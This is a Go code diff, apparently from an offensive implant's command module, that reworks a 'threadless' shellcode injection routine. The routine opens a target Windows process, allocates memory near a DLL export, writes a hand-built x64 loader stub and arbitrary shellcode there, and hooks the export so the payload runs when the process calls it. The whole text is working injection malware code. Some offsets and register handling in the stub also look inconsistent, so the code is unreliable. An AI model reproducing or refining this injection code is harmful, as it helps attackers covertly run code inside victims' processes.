@@ -5,6 +5,7 @@ package commands
 
 import (
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"syscall"
@@ -103,17 +104,14 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 
 	// Load necessary libraries
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
 	openProcess := kernel32.NewProc("OpenProcess")
 	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
 	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	createToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
-	module32First := kernel32.NewProc("Module32FirstW")
-	module32Next := kernel32.NewProc("Module32NextW")
+	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	readProcessMemory := kernel32.NewProc("ReadProcessMemory")
 	getModuleHandleW := kernel32.NewProc("GetModuleHandleW")
 	getProcAddress := kernel32.NewProc("GetProcAddress")
-	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
 
 	output += fmt.Sprintf("[+] Starting threadless injection into PID %d\n", pid)
 	output += fmt.Sprintf("[+] Target DLL: %s, Function: %s\n", dllName, functionName)
@@ -121,7 +119,7 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 
 	// Open target process
 	hProcess, _, err := openProcess.Call(
-		uintptr(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION),
+		uintptr(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_CREATE_THREAD),
 		0,
 		uintptr(pid),
 	)
@@ -131,41 +129,7 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	defer windows.CloseHandle(windows.Handle(hProcess))
 	output += fmt.Sprintf("[+] Opened process handle: 0x%x\n", hProcess)
 
-	// Allocate memory in target process
-	addr, _, err := virtualAllocEx.Call(
-		hProcess,
-		0,
-		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
-	)
-	if addr == 0 {
-		return output, fmt.Errorf("failed to allocate memory: %v", err)
-	}
-	output += fmt.Sprintf("[+] Allocated memory at: 0x%x\n", addr)
-
-	// Write shellcode to target process
-	var written uintptr
-	ret, _, err := writeProcessMemory.Call(
-		hProcess,
-		addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
-		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&written)),
-	)
-	if ret == 0 {
-		return output, fmt.Errorf("failed to write shellcode: %v", err)
-	}
-	output += fmt.Sprintf("[+] Wrote %d bytes to remote process\n", written)
-
-	// Find the target DLL in the remote process
-	dllBase, err := findRemoteModuleBase(hProcess, pid, dllName, createToolhelp32Snapshot, module32First, module32Next)
-	if err != nil {
-		return output, fmt.Errorf("failed to find DLL in remote process: %v", err)
-	}
-	output += fmt.Sprintf("[+] Found %s at base: 0x%x\n", dllName, dllBase)
-
-	// Get the function address in our own process first (to calculate offset)
+	// Get the function address in our local process to determine target
 	dllNamePtr, _ := syscall.UTF16PtrFromString(dllName)
 	localDllHandle, _, _ := getModuleHandleW.Call(uintptr(unsafe.Pointer(dllNamePtr)))
 	if localDllHandle == 0 {
@@ -178,20 +142,16 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 		return output, fmt.Errorf("failed to find function in local DLL")
 	}
 
-	// Calculate offset from DLL base
-	offset := localFuncAddr - localDllHandle
-	output += fmt.Sprintf("[+] Function offset in DLL: 0x%x\n", offset)
+	// The export address in the remote process (assumes same base address)
+	exportAddress := localFuncAddr
+	output += fmt.Sprintf("[+] Target function address: 0x%x\n", exportAddress)
 
-	// Calculate remote function address
-	remoteFuncAddr := dllBase + offset
-	output += fmt.Sprintf("[+] Remote function address: 0x%x\n", remoteFuncAddr)
-
-	// Read the first bytes of the function to backup (for trampoline)
-	var originalBytes [8]byte
+	// Read original bytes from the target function
+	originalBytes := make([]byte, 8)
 	var bytesRead uintptr
-	ret, _, _ = windows.NewLazySystemDLL("kernel32.dll").NewProc("ReadProcessMemory").Call(
+	ret, _, _ := readProcessMemory.Call(
 		hProcess,
-		remoteFuncAddr,
+		exportAddress,
 		uintptr(unsafe.Pointer(&originalBytes[0])),
 		8,
 		uintptr(unsafe.Pointer(&bytesRead)),
@@ -199,122 +159,153 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	if ret == 0 {
 		return output, fmt.Errorf("failed to read original function bytes")
 	}
+	output += fmt.Sprintf("[+] Read original bytes: %x\n", originalBytes)
 
-	// Create the hook: absolute JMP to our shellcode
-	// For x64: mov rax, <addr>; jmp rax (12 bytes total)
-	hook := make([]byte, 12)
-	hook[0] = 0x48 // mov rax,
-	hook[1] = 0xB8
-	*(*uint64)(unsafe.Pointer(&hook[2])) = uint64(addr) // shellcode address
-	hook[10] = 0xFF                                      // jmp rax
-	hook[11] = 0xE0
+	// Create the loader stub that will restore the function and execute shellcode
+	// This loader:
+	// 1. Saves all registers (push)
+	// 2. Restores the original function bytes
+	// 3. Executes the shellcode
+	// 4. Restores registers (pop)  
+	// 5. Jumps back to the now-restored function
+	loaderStub := []byte{
+		// Push all registers to save state
+		0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,
+		// mov rcx, <exportAddress> - address to restore
+		0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		// mov [rcx], <original8bytes> - restore original bytes
+		// We'll embed the original bytes here (8 bytes at offset 0x12)
+		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x48, 0x89, 0x01,
+		// sub rsp, 0x40 - allocate shadow space
+		0x48, 0x83, 0xEC, 0x40,
+		// call shellcode (relative call to shellcode immediately following loader)
+		0xE8, 0x0C, 0x00, 0x00, 0x00,
+		// add rsp, 0x40 - cleanup shadow space
+		0x48, 0x83, 0xC4, 0x40,
+		// Pop all registers to restore state
+		0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58,
+		// jmp to restored function
+		0xFF, 0xE0,
+		0x90, // nop for alignment
+	}
 
-	// Change protection on remote function to RWX
-	var oldProtect uint32
-	regionSize := uintptr(len(hook))
-	funcAddrPtr := remoteFuncAddr
-	ret, _, err = ntProtectVirtualMemory.Call(
+	// Embed the export address in the loader (offset 0x0D)
+	binary.LittleEndian.PutUint64(loaderStub[0x0D:0x15], uint64(exportAddress))
+	
+	// Embed the original bytes in the loader (offset 0x17)
+	binary.LittleEndian.PutUint64(loaderStub[0x17:0x1F], binary.LittleEndian.Uint64(originalBytes))
+
+	// Combine loader + shellcode
+	payload := append(loaderStub, shellcode...)
+	payloadSize := len(payload)
+	output += fmt.Sprintf("[+] Payload size (loader + shellcode): %d bytes\n", payloadSize)
+
+	// Find a memory hole within +/-2GB of the target function (required for relative call)
+	loaderAddress, err := findMemoryHole(hProcess, exportAddress, uintptr(payloadSize), virtualAllocEx)
+	if err != nil {
+		return output, fmt.Errorf("failed to find memory hole: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated memory at: 0x%x\n", loaderAddress)
+
+	// Write the payload to the allocated memory
+	ret, _, err = writeProcessMemory.Call(
 		hProcess,
-		uintptr(unsafe.Pointer(&funcAddrPtr)),
-		uintptr(unsafe.Pointer(&regionSize)),
+		loaderAddress,
+		uintptr(unsafe.Pointer(&payload[0])),
+		uintptr(payloadSize),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("failed to write payload: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote %d bytes to remote process\n", bytesRead)
+
+	// Change memory protection on payload to RX
+	var oldProtect uint32
+	ret, _, _ = virtualProtectEx.Call(
+		hProcess,
+		loaderAddress,
+		uintptr(payloadSize),
+		windows.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("failed to protect payload memory")
+	}
+	output += "[+] Changed payload memory to PAGE_EXECUTE_READ\n"
+
+	// Calculate relative address for the call instruction
+	relativeAddress := int64(loaderAddress) - int64(exportAddress) - 5
+	if relativeAddress > 0x7FFFFFFF || relativeAddress < -0x80000000 {
+		return output, fmt.Errorf("loader too far from target function for relative call")
+	}
+
+	// Create the hook: E8 <relative_address> (5 byte relative call)
+	hook := []byte{0xE8, 0x00, 0x00, 0x00, 0x00}
+	binary.LittleEndian.PutUint32(hook[1:5], uint32(relativeAddress))
+	output += fmt.Sprintf("[+] Hook bytes: %x\n", hook)
+
+	// Change protection on target function to RWX
+	ret, _, _ = virtualProtectEx.Call(
+		hProcess,
+		exportAddress,
+		8,
 		windows.PAGE_EXECUTE_READWRITE,
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
-	if ret != 0 {
-		return output, fmt.Errorf("failed to change memory protection: 0x%x", ret)
+	if ret == 0 {
+		return output, fmt.Errorf("failed to change function memory protection")
 	}
 	output += "[+] Changed function memory protection to RWX\n"
 
 	// Write the hook
 	ret, _, err = writeProcessMemory.Call(
 		hProcess,
-		remoteFuncAddr,
+		exportAddress,
 		uintptr(unsafe.Pointer(&hook[0])),
 		uintptr(len(hook)),
-		uintptr(unsafe.Pointer(&written)),
+		uintptr(unsafe.Pointer(&bytesRead)),
 	)
 	if ret == 0 {
 		return output, fmt.Errorf("failed to write hook: %v", err)
 	}
-	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", written)
+	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", bytesRead)
+
+	// Restore protection on target function to RX
+	ret, _, _ = virtualProtectEx.Call(
+		hProcess,
+		exportAddress,
+		8,
+		windows.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
 
 	output += "[+] Threadless injection complete!\n"
 	output += "[+] Shellcode will execute when the target process calls the hooked function\n"
+	output += "[+] After execution, the function will be automatically restored\n"
 
 	return output, nil
 }
 
-// findRemoteModuleBase finds the base address of a module in a remote process
-func findRemoteModuleBase(hProcess uintptr, pid uint32, moduleName string, createSnap, modFirst, modNext *windows.LazyProc) (uintptr, error) {
-	const TH32CS_SNAPMODULE = 0x00000008
-	const TH32CS_SNAPMODULE32 = 0x00000010
+// findMemoryHole finds a memory location within +/-2GB of the target address
+func findMemoryHole(hProcess uintptr, targetAddr uintptr, size uintptr, virtualAllocEx *windows.LazyProc) (uintptr, error) {
+	// Start searching from 2GB below target, up to 2GB above
+	startAddr := (targetAddr & 0xFFFFFFFFFFF70000) - 0x70000000
+	endAddr := targetAddr + 0x70000000
 
-	// Take snapshot of modules
-	hSnap, _, _ := createSnap.Call(
-		TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32,
-		uintptr(pid),
-	)
-	if hSnap == 0 || hSnap == uintptr(windows.InvalidHandle) {
-		return 0, fmt.Errorf("failed to create module snapshot")
-	}
-	defer windows.CloseHandle(windows.Handle(hSnap))
-
-	// MODULEENTRY32W structure
-	type MODULEENTRY32W struct {
-		Size         uint32
-		ModuleID     uint32
-		ProcessID    uint32
-		GlblcntUsage uint32
-		ProccntUsage uint32
-		ModBaseAddr  uintptr
-		ModBaseSize  uint32
-		HModule      windows.Handle
-		SzModule     [256]uint16
-		SzExePath    [260]uint16
-	}
-
-	var me MODULEENTRY32W
-	me.Size = uint32(unsafe.Sizeof(me))
-
-	// Get first module
-	ret, _, _ := modFirst.Call(hSnap, uintptr(unsafe.Pointer(&me)))
-	if ret == 0 {
-		return 0, fmt.Errorf("Module32First failed")
-	}
-
-	// Iterate through modules
-	for {
-		modName := syscall.UTF16ToString(me.SzModule[:])
-		if equalIgnoreCase(modName, moduleName) {
-			return me.ModBaseAddr, nil
-		}
-
-		ret, _, _ = modNext.Call(hSnap, uintptr(unsafe.Pointer(&me)))
-		if ret == 0 {
-			break
+	for addr := startAddr; addr < endAddr; addr += 0x10000 {
+		result, _, _ := virtualAllocEx.Call(
+			hProcess,
+			addr,
+			size,
+			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
+			uintptr(windows.PAGE_READWRITE),
+		)
+		if result != 0 {
+			return result, nil
 		}
 	}
 
-	return 0, fmt.Errorf("module %s not found in target process", moduleName)
-}
-
-// equalIgnoreCase compares two strings case-insensitively
-func equalIgnoreCase(a, b string) bool {
-	if len(a) != len(b) {
-		return false
-	}
-	for i := 0; i < len(a); i++ {
-		ca := a[i]
-		cb := b[i]
-		if ca >= 'A' && ca <= 'Z' {
-			ca += 32
-		}
-		if cb >= 'A' && cb <= 'Z' {
-			cb += 32
-		}
-		if ca != cb {
-			return false
-		}
-	}
-	return true
+	return 0, fmt.Errorf("could not find suitable memory hole within +/-2GB")
 }
